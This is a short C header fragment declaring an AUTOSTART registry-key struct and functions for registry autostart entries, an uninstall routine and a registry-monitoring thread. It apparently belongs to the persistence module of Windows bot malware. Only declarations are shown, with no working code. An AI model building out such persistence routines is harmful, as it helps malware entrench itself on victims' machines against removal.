typedef struct AUTOSTART
{
	HKEY hkey;
	LPCTSTR subkey;

} AUTOSTART;

//auto start
void uninstall(void);
void AutoStartRegs(char *nfilename);
#ifndef NO_REGMON
DWORD WINAPI AutoRegistry(LPVOID param);
#endif